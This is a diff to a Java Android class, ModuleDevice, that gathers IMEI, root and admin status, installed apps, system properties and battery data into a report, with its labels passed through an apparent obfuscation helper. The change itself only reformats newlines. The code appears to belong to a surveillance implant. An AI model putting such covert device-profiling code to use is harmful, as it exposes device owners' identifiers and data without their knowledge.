@@ -125,8 +125,8 @@ public class ModuleDevice extends BaseInstantModule {
 			
 			sb.insert(0, M.e("IMEI: ") + Device.self().getImei() + "\n");
 			sb.insert(0, M.e("Root: ") + (root?"yes":"no") + " " + M.e(", Admin: ") + (admin?"yes":"no") + "\n");
-			sb.insert(0, M.e("Free space: ") + freeSpace + " KB\n");
-			sb.insert(0, M.e("Battery: ") + battery + "%\n");
+			sb.insert(0, M.e("Free space: ") + freeSpace + " KB" + "\n");
+			sb.insert(0, M.e("Battery: ") + battery + "%" + "\n");
 			
 			
 		} catch (Exception ex) {
@@ -146,7 +146,7 @@ public class ModuleDevice extends BaseInstantModule {
 
 	private void getProcessList(final StringBuffer sb) {
 		if (processList) {
-			sb.append(M.e("\n-- INSTALLED APPS --") + "\n"); //$NON-NLS-1$
+			sb.append("\n" + M.e("-- INSTALLED APPS --") + "\n"); //$NON-NLS-1$
 			final ArrayList<PInfo> apps = getInstalledApps(false);
 			final int max = apps.size();
 
@@ -159,7 +159,7 @@ public class ModuleDevice extends BaseInstantModule {
 	private void getProperties(final StringBuffer sb) {
 		final Properties properties = System.getProperties();
 		
-		sb.append(M.e("\n-- PROPERTIES --") + "\n"); //$NON-NLS-1$
+		sb.append("\n" + M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
@@ -170,7 +170,7 @@ public class ModuleDevice extends BaseInstantModule {
 
 	private long getSystem(final StringBuffer sb) {
 		// SYSTEM
-		sb.append(M.e("\n-- SYSTEM --") + "\n"); //$NON-NLS-1$
+		sb.append("\n" + M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
 		sb.append(M.e("Board: ") + Build.BOARD + "\n");
 		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
 		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
@@ -215,7 +215,7 @@ public class ModuleDevice extends BaseInstantModule {
 	}
 
 	private int getBattery(final StringBuffer sb) {
-		sb.append(M.e("\n-- BATTERY --") + "\n");
+		sb.append("\n" + M.e("-- BATTERY --") + "\n");
 		
 		IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
 		Intent batteryStatus = Status.self().getAppContext().registerReceiver(null, ifilter);
